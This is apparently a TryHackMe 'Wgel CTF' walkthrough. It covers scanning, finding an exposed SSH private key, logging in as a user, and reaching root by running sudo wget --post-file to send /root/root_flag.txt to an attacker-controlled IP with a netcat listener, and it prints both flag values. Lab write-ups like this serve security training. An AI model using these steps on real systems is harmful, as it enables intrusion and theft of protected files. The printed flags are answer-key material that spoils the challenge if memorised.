---
title: "TryHackMe | Wgel CTF Write Up 01"
date: 2025-01-29 00:00:00 +0800
category: [Try Hack Me, Easy]
tags: [thm, writeups, web, boot to root]
image: Images/WriteUp-Image/THM/Easy/wgelctf/wWgel CTF 1.webp
alt: "wgel ctf"
---

## Step 1: Initial Reconnaissance with Nmap

### Command Used:

```sh
nmap -sV -sC -T4 -A 10.10.188.189
```

### Explanation:

- `-sV`: Detects service versions.
    
- `-sC`: Runs default scripts.
    
- `-A`: Enables OS detection, script scanning, and traceroute.
    
- `-T4`: Uses faster timing for scanning.
    

### Scan Results:

- Port 22 (SSH) is open, running OpenSSH 7.2p2 on Ubuntu.
    
- Port 80 (HTTP) is open, running Apache 2.4.18.
    
- OS detected: Linux.
    

### Next Steps:

Since an HTTP server is running, we will enumerate it further.

---

## Step 2: Enumerating the Web Server with Dirsearch

### Command Used:

```sh
dirsearch -u http://10.10.188.189
```

### Explanation:

- `dirsearch` is a tool used to find hidden directories and files on a web server.
    
- `-u http://10.10.188.189`: Specifies the target URL.
    

### Results:

- Found `/sitemap/`, indicating possible hidden files or directories.
    

---

## Step 3: Digging Deeper into `/sitemap/`

### Command Used:

```sh
dirsearch -u http://10.10.188.189/sitemap/
```

### Findings:

- `/sitemap/.ssh/id_rsa` was found.

![[Pasted image 20250401212512.png]]

![[Pasted image 20250401215101.png]]

- This file is likely an **SSH private key**, which can be used to log in to the system.
    

### Next Steps:

Download the `id_rsa` file and use it for SSH access.

---

## Step 4: Gaining SSH Access

### Commands Used:

```sh
nano id_rsa  # Open the file to view its contents
chmod 600 id_rsa  # Set proper permissions
ssh -i id_rsa jessie@10.10.188.189  # Log in using SSH key
```

### Explanation:

- `nano id_rsa`: Opens the SSH key.
    
- `chmod 600 id_rsa`: Ensures the key is secure.
    
- `ssh -i id_rsa jessie@10.10.188.189`: Logs in as user `jessie`.
    

### Result:

We successfully gained access to the machine as user `jessie`.

---

## Step 5: Finding User Flag

### Command Used:

```sh
locate flag.txt
cat /home/jessie/Documents/user_flag.txt
```

### Explanation:

- `locate flag.txt`: Searches for flag files.
    
- `cat /home/jessie/Documents/user_flag.txt`: Displays the user flag.
    

### Result:

- Found user flag: `057c67131c3d5e42dd5cd3075b198ff6`.
    

---

## Step 6: Privilege Escalation

### Command Used:

```sh
sudo -l
```

### Explanation:

- `sudo -l`: Lists commands the user can run as root.
    

### Result:

- User `jessie` can run `wget` as root.
    

---

## Step 7: Exploiting `wget` for Root Access

### Command Used:

```sh
sudo wget --post-file=/root/root_flag.txt http://10.6.33.153:443
```

### Explanation:

- This command uploads the root flag to an external server.
    
- We set up a listener to capture the flag.



---

## Step 8: Setting Up a Listener to Capture Root Flag

### Command Used:

```sh
nc -nlvp 443
```

### Explanation:

- `nc`: Netcat, used for network communication.
    
- `-n`: No DNS resolution.
    
- `-l`: Listen mode.
    
- `-v`: Verbose output.
    
- `-p 443`: Listen on port 443.
    

### Result:

- Captured root flag: `b1b968b37519ad1daa6408188649263d`.
    

---

## Conclusion

- We started with an **Nmap scan** to discover open ports.
    
- Used **Dirsearch** to find hidden directories.
    
- Found an **SSH key** and gained initial access.
    
- Located **user flag**.
    
- Used **sudo privileges** to escalate access to root.
    
- Retrieved the **root flag** using `wget`.
    

This is a basic example of a Capture The Flag (CTF) challenge walkthrough, demonstrating **recon, privilege escalation, and exploitation**. Keep practicing on platforms like TryHackMe and Hack The Box to sharpen your skills!

### Additional Resources:

- Nmap Cheatsheet: [https://nmap.org/book/man.html](https://nmap.org/book/man.html)
    
- Dirsearch Guide: [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
    
- Netcat Guide: [https://linux.die.net/man/1/nc](https://linux.die.net/man/1/nc)
    

Happy Hacking! 🚀
